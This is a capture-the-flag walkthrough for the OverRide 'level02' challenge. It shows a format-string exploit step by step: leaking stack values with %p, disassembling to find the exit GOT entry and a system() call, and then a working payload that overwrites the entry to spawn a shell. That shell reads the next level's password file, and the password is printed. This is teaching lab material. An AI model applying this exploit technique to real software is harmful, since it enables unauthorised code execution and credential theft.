# Walkthrough level02

First we have execute the program.  

```bash
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: root 
--[ Password: root
*****************************************
root does not have access!
```
A printf function is used in program. We can exploit printf because we can control the format string.   


```bash
level02@OverRide:~$ (python -c 'print("%p " * 12)' ; python -c 'print("a" * 8)' ; cat) | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe500 (nil) 0x61 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x6161616161616161 (nil) (nil) (nil) (nil)  does not have access!
```

We can see our buffer starts at 8th address.  
In the `password` we can override exit address. In `username` we can write our format string on the value of the address where we want to jump (source code line 45: system = 0x400a85 = 4196997) in the address contained in password. 



```bash
(gdb) disas 'exit@plt'
0000000000400710 <exit@plt>:
  400710:       ff 25 12 0b 20 00       jmp    QWORD PTR [rip+0x200b12]        # [601228] <_GLOBAL_OFFSET_TABLE_+0x68> 
  400716:       68 0a 00 00 00          push   0xa
  40071b:       e9 40 ff ff ff          jmp    400660 <_init+0x20>

(gdb) disas main
(...)
[400a85]:       bf 32 0d 40 00          mov    edi,0x400d32
400a8a:       e8 21 fc ff ff          call   4006b0 <system@plt>
```

Let's exploit this:

```bash
level02@OverRide:~$ (python -c 'print("%4196997d%8$n")' ; python -c 'print("\x28\x12\x60")' ; cat) | ./level02
...
whoami
level03
cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
 